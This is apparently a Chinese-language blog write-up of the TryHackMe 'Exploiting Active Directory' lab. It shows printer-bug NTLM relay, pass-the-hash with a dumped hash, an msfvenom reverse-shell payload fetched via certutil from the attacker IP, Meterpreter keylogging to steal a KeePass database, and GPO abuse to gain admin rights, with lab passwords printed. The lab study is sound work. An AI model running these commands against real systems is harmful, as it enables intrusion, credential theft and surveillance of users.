<p>通过利用约束委派，我们现在拥有访问 THMSERVER1 的特权！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610183847481.png" alt="image-20240610183847481"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610183905954.png" alt="image-20240610183905954"></p>
<h1 id="0x04-利用自动中继">0x04 利用自动中继</h1>
<p>在此任务中，我们将了解一些自动继电器。身份验证尝试不断地在网络上飞来飞去，正如 Breaching AD room 所示，如果幸运的话，我们可以拦截其中一些挑战以获得访问权限。但如果我们不喜欢等待怎么办？如果我们可以强制进行身份验证怎么办？</p>
<p>尽管我们已经拥有对 THMSERVER1 的特权访问权限，但我们可能无法访问受限委派漏洞。这是另一种出色的攻击，可以通过执行该攻击来获得对主机的特权访问。</p>
<h2 id="机器账户">机器账户</h2>
<p>所有 Windows 主机都有一个计算机帐户。本质上，这是与计算机关联的用户帐户。除非有人篡改了主机的账户，否则这些账户的密码是无法破解的。默认情况下，它们的长度为 120 个字符 (UTF16)，并且每 30 天自动轮换一次。</p>
<p>在 AD 中，这些计算机帐户在不同的服务中被大量使用。不同的域控制器使用其计算机帐户来同步 AD 更新和更改。当您代表正在使用的主机请求证书时，该主机的计算机帐户将用于对 AD 证书服务进行身份验证。</p>
<p>AD 中有一种特殊情况，其中一台机器对另一台机器具有管理员权限。本质上，在 AD 配置中，一台主机的管理权限已被授予另一台主机。同样，这是必须同步的域控制器或 SQL 集群等预期功能。然而，这些实例为强制身份验证提供了非常有趣的攻击媒介。</p>
<p>我们首先需要确定计算机帐户对另一台计算机具有管理访问权限的情况。我们可以使用 Bloodhound 来实现此目的，但这意味着我们必须编写一些自定义密码查询。单击 Bloodhound 中“分析”选项卡中的“创建自定义查询”：</p>
<p>我们要编写以下查询：</p>
<pre><code class="hljs scss">MATCH <span class="hljs-selector-tag">p</span>=(c1:Computer)-<span class="hljs-selector-attr">[r1:MemberOf*1..]</span>-&gt;(g:Group)-<span class="hljs-selector-attr">[r2:AdminTo]</span>-&gt;(n:Computer) RETURN <span class="hljs-selector-tag">p</span></code></pre>
<p>此查询将尝试查找一台计算机与另一台计算机具有“AdminTo”关系的实例。您应该看到与此类似的输出：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610185453505.png" alt="image-20240610185453505"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610185501873.png" alt="image-20240610185501873"></p>
<p>这很有趣。它向我们表明 THMSERVER2 计算机帐户对 THMSERVER1 计算机具有管理权限。</p>
<h2 id="打印机bug">打印机bug</h2>
<p><em>这不是一个错误，而是一个功能 - 微软。</em></p>
<p>说真的，当此事被报道时，微软回应称这是一项功能。打印机错误是 MS-RPRN 协议（PrintSystem 远程协议）的一项“功能”，该协议允许域用户远程强制运行 Print Spooler 服务的目标主机对任意 IP 地址进行身份验证。近年来出现了一些这样的错误：Spooler、PetitPotam、PrintNightmare。微软声称唯一的错误是其中一些根本不需要 AD 凭据，但这个问题已通过安全补丁解决。</p>
<p>因此，要利用这一点，除了机器帐户管理权限外，我们还需要满足以下四个条件：</p>
<ol>
<li>一组有效的 AD 帐户凭据。</li>
<li>与目标 SMB 服务的网络连接。</li>
<li>目标主机必须运行打印后台处理程序服务。</li>
<li>主机不得强制执行 SMB 签名。</li>
</ol>
<p>条件 1 和 2 已经满足。我们需要确保工作的唯一两个条件是条件 3 和 4。</p>
<h2 id="后台打印服务">后台打印服务</h2>
<p>我们需要确定打印后台处理程序服务是否正在运行。由于我们无法访问THMSERVER2，所以需要从网络角度进行查询。在这种情况下，我们可以使用 THMWRK1 上的 SSH 会话中的 WMI 查询来查询服务的当前状态：</p>
<pre><code class="hljs scss">PS C:\&gt; GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc


Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : <span class="hljs-number">0</span>
PrinterStatus : <span class="hljs-number">3</span>
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : <span class="hljs-number">0</span>
PrinterStatus : <span class="hljs-number">3</span>
ShareName     :
SystemName    : THMSERVER2</code></pre>
<p>cmdlet 的输出验证服务是否正在运行。如果我们收到访问被拒绝错误，您也许可以尝试使用 PowerShell 命令 <code>Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc</code> 。然而，微软一直在打击从网络角度查看这些端口。如果两者都给你带来了错误，你可能只需要大胆尝试一下。这样，条件三就满足了。</p>
<p>这里我就遇见了，上述两种命令都执行不了的情况</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610190839844.png" alt="image-20240610190839844"></p>
<p>只需要大胆一下，直接验证，发现不需要上面两条命令，我们也达到了预期的目的</p>
<h2 id="smb-签名">SMB 签名</h2>
<p>为了中继强制身份验证尝试，不应强制执行 SMB 签名。应该注意的是，允许 SMB 签名和强制执行 SMB 签名之间存在差异。由于某些旧系统不支持 SMB 签名，因此默认情况下，SMB 的配置是允许但不强制签名，这意味着只有支持时才会使用它。由于我们将托管恶意 SMB 服务器，因此我们可以确保我们的服务器不支持签名，从而强制目标不对 SMB 身份验证尝试进行签名。</p>
<p>为了验证 THMSERVER1 和 THMSERVER2 没有强制执行 SMB 签名，我们可以在 AttackBox 上使用 Nmap：</p>
<pre><code class="hljs scss">nmap <span class="hljs-attr">--script</span>=smb2-security-mode -p445 thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span> thmserver2<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610191023423.png" alt="image-20240610191023423"></p>
<p>我们可以看到 SMB 签名已启用，但根据输出并未强制执行。这意味着我们所有的条件都满足了，我们可以开始进攻了！</p>
<h2 id="利用身份验证中继">利用身份验证中继</h2>
<p><strong>注意：此攻击可能不稳定。滥用打印后台处理程序服务可能会导致其崩溃，并且并不总是保证回调。因此，上一个任务已为您提供了继续所需的权限。然而，了解身份验证中继以及如何强制执行它们对于 AD 攻击至关重要。因此，下面提供了执行此类攻击的步骤。您可以决定尝试一下，但不能保证回调。如果它不起作用，请继续执行下一个任务，也许在您的房间旅程结束时再次探索这个问题。</strong></p>
<p>我们将使用 <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> 来利用身份验证中继。它是一个 C# 漏洞利用程序，但已为您编译并存储在 THMWRK1 上的 <code>C:\Tools\</code> 目录中。我们将使用 Spoolsample.exe 强制 THMSERVER2 在 AttackBox 上向我们进行身份验证，然后使用 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a> 的 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.p</a>y 中继 THMSERVER1 的身份验证尝试。请注意，如果您使用自己的 VM，则需要确保您拥有支持 SMBv2 的 Impacket 更新版本。</p>
<p>第一步是设置 NTLM 中继。在我们的 AttackBox 上，我们可以使用以下内容：</p>
<pre><code class="hljs scss">python3<span class="hljs-selector-class">.9</span> /opt/impacket/examples/ntlmrelayx<span class="hljs-selector-class">.py</span> -smb2support -t smb://<span class="hljs-string">"10.200.60.201"</span> -debug</code></pre>
<p>如果我们指定 THMSERVER1 的主机名而不是 IP，则主机可以请求我们使用 Kerberos 身份验证而不是 NTLM。因此，我们应该指定 IP。通过中继监听，我们现在可以强制THMSERVER2向我们进行身份验证。在 THMWRK1 上的 SSH 终端中，执行以下命令：</p>
<pre><code class="hljs scss">C:\Tools\&gt;SpoolSample.exe THMSERVER2.za.tryhackme.loc <span class="hljs-string">"10.50.57.78"</span>

python3.<span class="hljs-number">9</span> /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://<span class="hljs-string">"10.50.81.216"</span> -c <span class="hljs-string">'type C:\\Users\\Administrator\\Desktop\flag3.txt'</span> -debug</code></pre>
<p>您的攻击者 IP 应与网络的 tunX 接口相对应。如果一切顺利，您应该已经收到了身份验证尝试和THMSERVER1中继。</p>
<p>这里我自己的impacket包有问题，用attackbox了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610202536120.png" alt="image-20240610202536120"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610202527688.png" alt="image-20240610202527688"></p>
<pre><code class="hljs scss">ServerAdmin:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">3279</span>a0c6dfe15dc3fb6e9c26dd9b066c:::</code></pre>
<p>得到凭据之后，我们利用凭据，直接远程登陆</p>
<pre><code class="hljs scss">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.200</span><span class="hljs-selector-class">.60</span><span class="hljs-selector-class">.202</span> -u ServerAdmin -H <span class="hljs-number">3279</span>a0c6dfe15dc3fb6e9c26dd9b066c</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610203239846.png" alt="image-20240610203239846"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615111902147.png" alt="image-20240615111902147"></p>
<h1 id="0x05-利用ad用户">0x05 利用AD用户</h1>
<p>到目前为止，我们的剥削已经走了很远。我们对工作站和服务器具有完全的管理访问权限。从本质上讲，我们可以在几乎任何 Tier 1 和 Tier 2 系统上执行后利用。但我们仍然想走得更远。下一个任务也可以看作是后利用，但当我们仍在执行利用以达到目标执行的合适位置时，通常是一个很好的东西。现在是我们定位 AD 用户的时候了。</p>
<h2 id="用户和用户行为">用户和用户行为</h2>
<p><em>未来的工厂将只有两名员工。一个人和一条狗。人类会在那里喂狗。如果人类试图触摸某物，狗会在那里咬人。- 沃伦·本尼斯</em></p>
<p>不幸的是，用户往往是安全链中最薄弱的环节。想想弱密码和坏习惯，例如授予过于宽松的权限。忽视这个攻击面将是无知和无效的。虽然建立针对 AD 用户的正确枚举和攻击方法很好，但在此任务中，我们将重点关注两个要素：</p>
<ul>
<li>凭据管理 - 用户如何存储其凭据。在 AD 中，这非常重要，因为用户可能拥有多组凭据，记住所有这些凭据可能会很麻烦。</li>
<li>键盘记录 - 通常，在利用过程中，我们需要了解普通用户如何与系统交互。与屏幕截图一起，键盘记录可以成为从攻击者的角度获得这种理解的有用工具。</li>
</ul>
<h2 id="搜寻凭据">搜寻凭据</h2>
<p>既然我们已经妥协了THMSERVER1，我们可能应该环顾四周，看看是否有任何有用的信息。查看用户目录，看看其中是否有一些有用的信息。</p>
<p>枚举工作应将您引导至 .kdbx 文件。快速谷歌应该证实我们的怀疑，这个文件确实非常有价值！我们可以使用 Meterpreter 的下载命令来恢复此文件。</p>
<p>此文件似乎是一个凭据数据库。但是，问题在于数据库是使用密码加密的。我们可以尝试破解密码，但任何使用凭据数据库的人通常都精明地确保初始密码是安全的。我们可能会更成功地看到用户如何与此数据库交互。</p>
<h2 id="system-有时太特权了">SYSTEM 有时太特权了</h2>
<p>Meterpreter 有一个内置的键盘记录器。这对于提取用户的击键非常有用。然而，我们不能只是启动这个键盘记录器并希望得到最好的结果，因为我们的 shell 当前正在系统上下文中运行。 SYSTEM 不会输入任何按键，所以这对我们没有帮助。为了捕获正确的用户凭据，我们需要确保 shell 正在该用户的上下文中运行。</p>
<p>幸运的是，Meterpreter 为我们提供了迁移功能，由于我们以 SYSTEM 身份运行，所以我们应该能够迁移到任何进程。您可以在 THMSERVER1 上执行远程代码，使用它来获取 Meterpreter shell。如果您需要回顾一下 Meterpreter 和 Metasploit 的使用，<a target="_blank" rel="noopener" href="https://tryhackme.com/module/metasploit">这里有一个关于其使用的模块</a>。不过，为了快速了解，您可以使用以下命令生成 PowerShell meterpreter 有效负载：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.57</span><span class="hljs-selector-class">.78</span> LPORT="<span class="hljs-number">5555</span>" -f psh -o shell<span class="hljs-selector-class">.ps1</span></code></pre>
<pre><code class="hljs scss">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615120940755.png" alt="image-20240615120940755"></p>
<p>您可以使用 Python Web 服务器托管 meterpreter shell，然后使用如下内容复制它：</p>
<pre><code class="hljs scss">certutil<span class="hljs-selector-class">.exe</span> -urlcache -split -f http://<span class="hljs-number">10.50</span>.<span class="hljs-number">57.78</span>:<span class="hljs-number">81</span>/shell.ps1</code></pre>
<p>一旦您拥有了 meterpreter shell，您就可以继续。第一步是查看用户本机上是否有正在运行的进程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615121227758.png" alt="image-20240615121227758"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615121250159.png" alt="image-20240615121250159"></p>
<p>一旦您拥有了 meterpreter shell，您就可以继续。第一步是查看用户本机上是否有正在运行的进程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615124627521.png" alt="image-20240615124627521"></p>
<p>注意：如果您没有看到 trevor.local 用户的 explorer.exe 进程，您可以通过执行以下步骤自行启动该进程：</p>
<ol>
<li>使用以下命令重置 trevor.local 用户的密码： <code>net user trevor.local HybcxHack123</code></li>
<li>在 powershell 中运行以下命令： <code>C:\auto-login.ps1 trevor.local HybcxHack123 THMSERVER1</code></li>
<li>使用 <code>shutdown -r</code> 重新启动服务器</li>
<li>服务器重新上线后，您应该会看到资源管理器进程。</li>
</ol>
<p>看来我们很幸运！用户在 THMSERVER1 上有一个活动会话。让我们迁移到该用户的一个进程。最安全的选择通常是像explorer.exe这样：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615124712689.png" alt="image-20240615124712689"></p>
<p>现在我们准备启动我们的键盘记录器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615124754064.png" alt="image-20240615124754064"></p>
<p>现在我们必须耐心等待。如果幸运的话，我们将获得一些凭证！给它几分钟，然后运行以下命令来转储捕获的击键：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615125513175.png" alt="image-20240615125513175"></p>
<p>这是针对 AD 用户的一个简单示例。还有很多事情可以做。将用户定位纳入 AD 开发方法中至关重要。要回答此任务的问题，您将需要 Keepass。它已为您安装在 AttackBox 上，因此您只需搜索并运行该应用程序即可。如果您使用自己的 VM，则在大多数 Linux 发行版上 <code>sudo apt install keepassx</code> 都可以工作。或者您可以从这里下载。另请确保使用 meterpreter <code>download</code> 命令将 Keepass 数据库下载到您的主机。如果您使用 Kali，请在打开数据库文件之前确保 kali 用户拥有该数据库文件，否则可能会锁定数据库并给出错误的结果。</p>
<p>虽然持久性只会在隔壁房间讨论，但现在可能是在 THMSERVER1 上创建本地帐户并授予其管理员权限的好时机，以便您有一个良好的立足点。由于其余任务实际上并不需要这样做，因此如果您想这样做，您需要自己对此进行一些研究。</p>
<p>我们这里需要download trevor.local用户的kdbx数据库文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615130658104.png" alt="image-20240615130658104"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615130809950.png" alt="image-20240615130809950"></p>
<h1 id="0x06-利用gpos">0x06 利用GPOs</h1>
<p>通过对用户进行键盘记录，我们可以解密他们的凭据数据库，从而为我们提供有助于进一步实现 AD 攻击目标的凭据，即 svcServMan 帐户。我们需要执行一些枚举来弄清楚这些凭证的用途。幸运的是，我们已经有了可以使用的 Sharphound 数据。使用 Bloodhound 中的搜索功能，让我们检查一下所发现的帐户拥有的权限：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615134947393.png" alt="image-20240615134947393"></p>
<p>该帐户的一项权限尤其突出，即对组策略对象 (GPO) 的所有权。此外，当我们进行一些调查时，似乎此 GPO 已应用于我们的 THMSERVER2 机器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615135500127.png" alt="image-20240615135500127"></p>
<p>这可能为我们提供进一步开发 AD 的理想机会！</p>
<h2 id="组策略对象">组策略对象</h2>
<p>还记得我们在枚举 AD 中讨论过 SYSVOL 目录吗？这是存储 AD GPO 的目录，以便将其复制到加入域的计算机。 GPO 是策略设置的虚拟集合。每个 GPO 都有一个唯一的名称，称为 GUID。这就是为什么如果您尝试读取 SYSVOL 目录的内容，那么所有随机名称都没有多大意义。</p>
<p>每台 Windows 计算机都有一个本地策略配置。这包含几个值得注意的配置，例如：</p>
<ul>
<li>防火墙、防病毒和 Applocker 等服务的应用程序配置。</li>
<li>本地组成员身份，例如管理员或远程桌面用户组。</li>
<li>启动配置，例如应执行的脚本。</li>
<li>安全和协议设置，例如 SMBv1 支持。</li>
</ul>
<p>这些只是几个例子。有大量可以设置的配置选项。</p>
<h2 id="组策略管理">组策略管理</h2>
<p>如果您只有一台 Windows 计算机，则可以轻松地直接在主机上更改本地策略配置。但是，您需要一种机制来从大型组织的中央位置部署配置。这就是组策略管理 (GPM) 发挥作用的地方。 GPM 允许我们直接在 AD 结构上定义策略，而不是在每台机器上本地定义策略。本质上，我们可以为 AD 对象定义 GPO，例如特定的 OU 或组。</p>
<p>然后，加入域的计算机将定期从 SYSVOL 中提取所有策略并应用相关策略。默认情况下，策略每 15 分钟通过 gpupdate 应用程序复制一次。但是，我们也可以从命令提示符手动执行此应用程序以立即应用策略。</p>
<h2 id="利用-gpos">利用 GPOs</h2>
<p>尽管可以通过多种方式利用 GPO，但我们将坚持使用简单的解决方案，将我们控制的 AD 帐户添加到本地管理员组和本地远程桌面用户组。这将允许我们获得 THMSERVER2 的管理权限以及 RDP 的能力。我们还可以使用公开的 SSH 端口，但没有多少组织已升级为提供 SSH 访问。因此，RDP 访问或传统的横向移动技术（如 SMBExec）更安全。</p>
<p>为了修改GPO，我们需要以具有相关权限的AD用户访问组策略管理。我们可以以用户身份通过​​ RDP 进入 THMSERVER1，但这可能会将用户踢出其活动会话，从而引起怀疑。相反，我们将使用普通帐户或第 2 层管理员帐户通过 RDP 进入 THMWRK1，使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 来修改 GPO。有关 runas 命令的回顾，请参阅枚举 AD 空间；但是，此处还提供了应从管理命令提示符窗口执行的所需命令：</p>
<pre><code class="hljs scss">xfreerdp /v:thmwrk1.za.tryhackme.loc /u:<span class="hljs-string">'t2_robin.wyatt'</span> /p:<span class="hljs-string">'Hy8cx@123'</span> /cert:ignore</code></pre>
<p>利用获取到的第二层管理员的账户，通过RDP进入THMWRK1</p>
<pre><code class="hljs scss">runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe</code></pre>
<p>出现提示后，提供与帐户关联的密码。要验证您是否提供了正确的凭据，您可以运行 <code>dir \\za.tryhackme.loc\sysvol</code> 。在新生成的命令提示符窗口中，我们可以启动 Microsoft 管理控制台：//输入密码：Sup3rStr0ngPass!@</p>
<pre><code class="hljs scss">mmc</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615141332526.png" alt="image-20240615141332526"></p>
<p>我们现在要添加组策略管理管理单元：</p>
<ol>
<li>单击文件 -&gt; 添加/删除管理单元</li>
<li>选择组策略管理管理单元并单击添加</li>
<li>单击“确定”</li>
</ol>
<p>您现在应该能够看到 <a target="_blank" rel="noopener" href="http://za.tryhackme.com">za.tryhackme.com</a> 域的 GPO：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615142633028.png" alt="image-20240615142633028"></p>
<p>现在，我们可以导航到用户有权修改的 GPO（服务器 &gt; 管理服务器 &gt; 管理服务器推送）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615143008368.png" alt="image-20240615143008368"></p>
<p>我们可以右键单击 GPO 并选择“编辑”。这将打开新的组策略管理编辑器窗口。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615143102244.png" alt="image-20240615143102244"></p>
<p>为了将我们的帐户添加到本地组，我们需要执行以下步骤：</p>
<ol>
<li>展开计算机配置</li>
<li>展开政策</li>
<li>展开 Windows 设置</li>
<li>展开安全设置</li>
<li>右键单击“受限组”并选择“添加组”（如果 IT 支持组已存在，则意味着有人已经执行了该漏洞利用。您可以将其删除并自行创建，或者只是检查它以查看配置的内容。）</li>
<li>单击“浏览”，输入“IT 支持”，然后单击“检查姓名”</li>
<li>单击“确定”两次</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615143332072.png" alt="image-20240615143332072"></p>
<p>不使用第一个过滤器。对于第二个过滤器，我们要添加管理员组和远程桌面用户组。最后，它应该看起来像这样：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615143525317.png" alt="image-20240615143525317"></p>
<p>配置完成后，我们可以单击“应用”和“确定”。现在，我们需要做的就是等待最多 15 分钟，GPO 就会被应用。此后，我们作为 IT 支持组成员的初始帐户现在将拥有 THMSERVER2 的管理和 RDP 权限！</p>
<pre><code class="hljs scss">xfreerdp /v:thmserver2.za.tryhackme.loc /u:<span class="hljs-string">'christine.hall'</span> /p:<span class="hljs-string">'Randall1973'</span> /cert:ignore</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615150216971.png" alt="image-20240615150216971"></p>
<p>当然也可以选择RDP连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615150315781.png" alt="image-20240615150315781"></p>
<h1 id="0x07-利用证书">0x07 利用证书</h1>
<p>现在我们已经可以访问 THMSERVER2，我们通过利用所有第 1 层资产（服务器）进一步推进了利用 AD 的旅程。然而，我们再次陷入困境，没有简单的方法可以进入下一层。同样，我们需要寻找更多的创意途径。</p>
<p>SpectreOps 完成并作为<a target="_blank" rel="noopener" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">白皮书</a>发布的研究表明，可以利用配置错误的证书模板进行权限升级和横向移动。如果您想更好地了解证书错误配置以及如何识别它们，请查看<a target="_blank" rel="noopener" href="http://tryhackme.com/jr/adcertificatetemplates">此房间</a>。</p>
<h2 id="ad证书服务">AD证书服务</h2>
<p>AD 证书服务 (CS) 是 Microsoft 的公钥基础设施 (PKI) 实现。由于 AD 为组织提供了一定程度的信任，因此它可以用作 CA 来证明和委托信任。 AD CS 可用于多种用途，例如加密文件系统、创建和验证数字签名，甚至用户身份验证，这使其成为攻击者的一个有希望的途径。</p>
